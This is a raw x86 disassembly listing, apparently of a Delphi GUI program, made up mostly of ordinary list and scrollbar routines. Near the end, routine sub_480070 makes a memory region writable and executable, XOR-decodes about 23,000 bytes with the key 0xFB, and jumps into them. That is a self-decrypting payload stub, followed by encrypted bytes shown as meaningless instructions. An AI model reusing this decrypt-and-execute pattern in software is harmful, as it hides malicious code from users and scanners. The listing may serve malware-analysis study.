push eax
mov eax [ ebp - 0x4 ]
call sub_47e2bc
mov edx [ ebp - 0x4 ]
push [ edx + 0x23c ]
mov edx [ ebp - 0x8 ]
pop ecx
sub edx ecx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x60 ]
lea ecx [ ebp - 0xc ]
mov edx edi
mov eax esi
call sub_47df2c
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_47e2bc
pop edx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x23c ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
push esi
mov ecx [ ebp - 0x8 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xf8 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xf8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47eec3
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f64
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_47e2bc
call sub_4191b0
retn
sub_47eed0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2ec ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2ec ] 0x1
xor eax eax
push ebp
push sub_47ef6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_47e01c
dec eax
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x22c ]
jg r-xdata
mov eax [ ebp - 0x4 ]
call sub_47e2bc
mov edx [ ebp - 0x4 ]
push [ edx + 0x23c ]
mov edx ebx
pop ecx
sub edx ecx
mov ecx [ eax ]
call [ ecx + 0x48 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2ec ] 0x0
retn
mov eax [ ebp - 0x4 ]
call sub_47e2bc
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x22c ]
dec edx
mov eax [ ebp - 0x4 ]
call sub_479550
sub_47ef78
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
xor eax eax
push ebp
push j_sub_4038c0#5
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x2f8 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f02d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_436158
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f8 ]
call sub_47096c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f8 ]
call sub_47b154
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f8 ]
call sub_47096c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40434c
setne bl
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f8 ]
call sub_436314
sub_47f038
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
push ebp
call sub_47ef78
pop ecx
mov ebx eax
test bl bl
jne r-xdata
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_47df78
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x22c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xe4 ]
mov bl 0x1
sub_47f078
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_47e2bc
mov ecx edi
mov edx esi
mov ebp [ eax ]
call [ ebp + 0x70 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_47a0c8
pop ebp
pop edi
pop esi
pop ebx
retn
sub_47f0a4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_47f13f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x312 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f146
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
mov eax [ ebx + 0x27c ]
call sub_436158
test al al
je r-xdata
mov esi [ ebx + 0x22c ]
push esi
lea eax [ ebp - 0x4 ]
push eax
mov ecx esi
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf4 ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebx + 0x22c ]
mov edx 0x1
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf4 ]
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebx + 0x228 ]
mov edx ebx
mov eax [ ebx + 0x314 ]
call [ ebx + 0x310 ]
sub_47f14c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov edi eax
cmp esi [ edi + 0x22c ]
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
mov ecx esi
mov edx ebp
mov eax edi
call sub_47a0e8
test al al
je r-xdata
mov eax edi
call sub_47e2bc
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor ebx ebx
jmp r-xdata
mov eax edi
call sub_47f3dc
test ah 0x10
jne r-xdata
mov eax edi
call sub_47df78
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl 0x1
test [ edi + 0x2e0 ] 0x1
jne r-xdata
cmp [ edi + 0x2ec ] 0x0
jne r-xdata
test ebp ebp
jg r-xdata
mov eax [ edi + 0x22c ]
cmp esi eax
setl bl
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe4 ]
test bl bl
jne r-xdata
push 0x1
mov ecx esi
dec ecx
mov edx ebp
mov eax edi
call sub_476d4c
jmp r-xdata
sub_47f1ec
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_47f257
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x22c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xf4 ]
mov eax [ ebp - 0x4 ]
call sub_404200
test eax eax
jle r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x2e0 ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f25e
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov bl 0x1
sub_47f280
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
add eax 0xffffffe5
cmp eax 0x13
ja r-xdata
mov edx [ ebp - 0x8 ]
mov cl [ ebp - 0x9 ]
mov eax [ ebp - 0x4 ]
call sub_4782b4
mov esp ebp
pop ebp
retn
mov al [ eax + lookup_table_47f2ae ]
jmp [ eax * 4 + jump_table_47f2c2 ]
mov al [ r-xdata ]
cmp al [ ebp - 0x9 ]
jne r-xdata
mov al [ r-xdata ]
cmp al [ ebp - 0x9 ]
jne r-xdata
push ebp
call sub_47f1ec
pop ecx
test al al
je r-xdata
mov al [ r-xdata ]
cmp al [ ebp - 0x9 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_47f038
mov al [ r-xdata ]
cmp al [ ebp - 0x9 ]
jne r-xdata
push ebp
mov eax [ ebp - 0x4 ]
call sub_47e01c
dec eax
call sub_47f264
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_47f264
pop ecx
jmp r-xdata
push ebp
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_47ed8c
call sub_47f264
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2e0 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47e01c
dec eax
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x22c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x22c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xe4 ]
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
push ebp
call sub_47f1ec
pop ecx
test al al
je r-xdata
push ebp
push 0x1
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_47ed8c
call sub_47f264
pop ecx
jmp r-xdata
sub_47f2b4
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add eax [ edi + edi * 4 ]
inc edi
add dl bl
inc edi
add [ ebp - 0xd ] al
inc edi
add [ ecx - 0xd ] ah
inc edi
add [ ebx - 0x48ffb80d ] al
inc edi
add [ eax + r-xdata ] ah
cmp al [ ebp - 0x9 ]
jne r-xdata
mov al [ r-xdata ]
cmp al [ ebp - 0x9 ]
jne r-xdata
push ebp
mov eax [ ebp - 0x4 ]
call sub_47e01c
dec eax
call sub_47f264
pop ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov cl [ ebp - 0x9 ]
mov eax [ ebp - 0x4 ]
call sub_4782b4
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_47e01c
dec eax
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x22c ]
jne r-xdata
push ebp
call sub_47f1ec
pop ecx
test al al
je r-xdata
push ebp
push 0x1
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_47ed8c
call sub_47f264
pop ecx
jmp r-xdata
sub_47f3e8
push ecx
mov [ esp ] dx
test [ esp + 0x1 ] 0x2
je r-xdata
mov dx [ esp ]
call sub_4794d8
pop edx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
sub_47f418
push ebx
mov ebx eax
mov eax ebx
call sub_443384
push 0x0
push 0x0
push 0x0
push 0x1
mov eax ebx
call sub_446450
push eax
call SetScrollRange
pop ebx
retn
sub_47f43c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_40360c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xf0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_474e7c
mov eax [ ebp - 0x4 ]
call sub_479664
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47f46e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
call sub_403920
call sub_403974
mov eax [ ebp - 0x4 ]
call sub_474e7c
mov eax [ ebp - 0x4 ]
call sub_479664
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47f4bc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x34 ] ecx
xor edx edx
mov eax esi
call sub_40313c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_47f4f4
push ebp
mov ebp esp
mov ecx 0x7
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47f61c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41905c
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f623
lea eax [ ebp - 0x38 ]
mov edx [ r-xdata ]
mov ecx 0x3
call sub_4049c8
retn
mov edi ebx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea eax [ ebp - 0x28 ]
mov edx ebx
mov cl 0xfc
call sub_4131fc
lea edx [ ebp - 0x28 ]
mov ecx edi
mov eax [ ebp - 0x4 ]
call sub_47fb98
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
lea eax [ ebp - 0x18 ]
mov edx ebx
mov cl 0xfc
call sub_4131fc
lea edx [ ebp - 0x18 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_47f974
mov edi eax
test edi edi
je r-xdata
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test eax eax
je r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
lea eax [ ebp - 0x38 ]
mov edx ebx
mov cl 0xfc
call sub_4131fc
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
pop ecx
call sub_47fb98
sub_47f62c
push esi
mov esi eax
mov eax esi
call sub_419e54
cmp [ esi + 0x8 ] 0x0
jne r-xdata
pop esi
retn
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x34 ]
cmp [ eax + 0x2f0 ] 0x0
jne r-xdata
mov eax [ esi + 0x34 ]
mov si 0xff9d
call sub_403368
sub_47f67c
push ebx
push esi
push edi
add esp 0xfffffff4
mov [ esp ] cl
mov esi edx
mov edi eax
mov bl 0x1
mov edx esi
mov eax r-xdata
call sub_404544
test eax eax
je r-xdata
mov eax [ edi + 0x34 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
mov eax ebx
add esp 0xc
pop edi
pop esi
pop ebx
retn
test [ eax + 0x2e0 ] 0x8
je r-xdata
test esi esi
je r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
inc eax
sete bl
mov eax ebx
xor al 0x1
and al [ esp ]
je r-xdata
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0xb
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
sub_47f70f
inc [ ecx ]
add [ eax ] al
add [ 0x53000000 ] bh
push esi
push edi
mov esi eax
mov eax esi
call sub_419e70
mov eax [ esi + 0x30 ]
call sub_404f68
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
push 0x0
lea eax [ esi + 0x30 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405124
add esp 0x4
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ esi + 0x30 ]
mov eax [ eax + edi * 4 ]
call sub_40316c
inc edi
dec ebx
jne r-xdata
sub_47f764
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47f8a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push j_sub_4038c0#4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax [ ebp - 0xc ]
call sub_41808c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx [ r-xdata ]
call sub_405130
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41a36c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f870
mov eax [ ebp - 0xc ]
call sub_40316c
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_417fe0
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_417ef0
mov edx [ ebp - 0x10 ]
mov eax [ edx + eax * 4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x30 ]
mov [ edx + ebx * 4 ] eax
inc ebx
dec esi
jne r-xdata
sub_47f870
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_475000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f8ab
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f64
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_405224
retn
sub_47f8b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov edx esi
mov eax ebx
call sub_419eb0
mov eax [ ebx + 0x30 ]
mov eax [ eax + esi * 4 ]
call sub_40316c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
push eax
lea eax [ ebx + 0x30 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405124
add esp 0x4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x30 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x30 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028d8
sub_47f930
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_419f1c
mov eax [ ebx + 0x30 ]
mov eax [ eax + esi * 4 ]
mov edx [ ebx + 0x30 ]
mov edx [ edx + edi * 4 ]
mov ecx [ ebx + 0x30 ]
mov [ ecx + esi * 4 ] edx
mov edx [ ebx + 0x30 ]
mov [ edx + edi * 4 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_47f974
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4038c0#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor esi esi
mov eax esi
call sub_414150
test al al
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_412384
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov edi eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
call sub_40fa4c
mov edi eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + edi * 4 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp edi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fa49
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
test esi esi
jne r-xdata
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] 0xd
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
mov ecx [ ebx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_47fbb8
mov esi eax
mov eax [ ebx + 0x30 ]
mov [ eax + edi * 4 ] esi
jmp r-xdata
sub_47fa54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47fb16
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4193e8
mov edx [ ebp - 0x8 ]
mov cl 0x1
mov eax ebx
call sub_47f67c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41a14c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
push eax
lea eax [ ebx + 0x30 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405124
add esp 0x4
cmp edi esi
jle r-xdata
mov eax [ ebx + 0x30 ]
xor edx edx
mov [ eax + esi * 4 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fb1d
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
sub edi esi
mov ecx edi
shl ecx 0x2
mov eax [ ebx + 0x30 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x30 ]
lea eax [ eax + esi * 4 ]
call sub_4028d8
sub_47fb28
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47fb8a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4193e8
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
cmp esi eax
setne cl
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47f67c
mov ecx edi
mov edx esi
mov eax ebx
call sub_41a1c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fb91
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_47fb98
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_47f974
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_47fbdc
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41847c
mov eax [ esi + 0x10 ]
call sub_40316c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_47fc0c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41858c
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
mov esi eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_47fc88
mov dl [ ebx + 0xc ]
mov eax esi
call sub_47fca4
mov eax ebx
call sub_47fcf0
push eax
mov eax esi
call sub_47fcf0
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_47fcc4
mov dl [ ebx + 0x18 ]
mov eax esi
call sub_47fd3c
mov edx [ ebx + 0x1c ]
mov eax esi
call sub_47fcb0
pop esi
pop ebx
retn
sub_47fcd0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_47fcf0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov esi eax
mov [ ebx + 0x10 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_47fd6c
sub_47fd1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_47fcf0
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
call sub_47fd48
pop esi
pop ebx
retn
sub_47fd6c
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x2
jne r-xdata
mov eax ebx
call sub_47fcf0
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
pop ebx
retn
mov eax ebx
call sub_47fcf0
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jne r-xdata
mov dl 0x2
mov eax ebx
call sub_47fca4
pop ebx
retn
xor edx edx
mov eax ebx
call sub_47fca4
sub_47fdb4
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4038c0#2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fde0
retn
sub_480070
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
nop
test ebx ebx
je r-xdata
push r-xdata
call sub_480070
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x76 ] 0xffffffbe
jg r-xdata
nop
nop
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5a63
push ebx
call VirtualProtect
nop
nop
xor eax eax
stosd [ edi ]
adc bh [ ecx + ebp * 4 ]
sti
sti
imul ebp [ ebx - 0x5d ] 0xffffff91
mov [ ebp - 0x8 ] eax
nop
nop
mov edx [ ebp - 0x8 ]
add edx ebx
mov dl [ edx ]
xor dl 0xfb
mov ecx [ ebp - 0x8 ]
add ecx ebx
mov [ ecx ] dl
nop
nop
inc eax
cmp eax 0x5a64
jne r-xdata
add ebx 0x2253
mov [ ebp - 0x4 ] ebx
jmp [ ebp - 0x4 ]
aad 0x12
push edi
clc
sti
sti
imul ebp [ ebx + 0x6b ] 0xfffffff4
jg r-xdata
xchg ecx eax
sti
cmp [ edx + 0x378fbfb ] 0xfc7ef4fa
sti
sti
sti
test al 0x4
insd
push edi
sti
sti
sti
adc dl [ edx + 0x6bfbfba2 ]
imul ebp [ ebx - 0x45deaed ] 0xfffffffb
js r-xdata
jo r-xdata
aad 0xd4
sti
imul [ eax - 0x52fb066f ]
div [ eax + 0x23 ]
js r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
popfd
jb r-xdata
adc eax [ ecx + 0x78fbfbba ]
add edi edx
loope r-xdata
imul edx [ ebx ] 0xffffff8d
sti
jo r-xdata
add al 0xf4
jle r-xdata
hlt
mov edx 0x378fbfb
cli
add ecx eax
cmp ebx [ ebp - 0x6cfe418e ]
adc ebx edx
sti
jle r-xdata
sti
sti
xchg ebx eax
arpl cx ax
sti
sti
add al 0xad
adc edi eax
scasb [ edi ]
sti
sti
jo r-xdata
sti
test al 0xfb
sti
enter 0x123b 0x97
mov al 0xfb
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ edx - 0x42 ] 0x7
adc bh [ edx + 0x6bfbfbc8 ]
imul ebp [ ebx + 0x13 ] 0xffffff8d
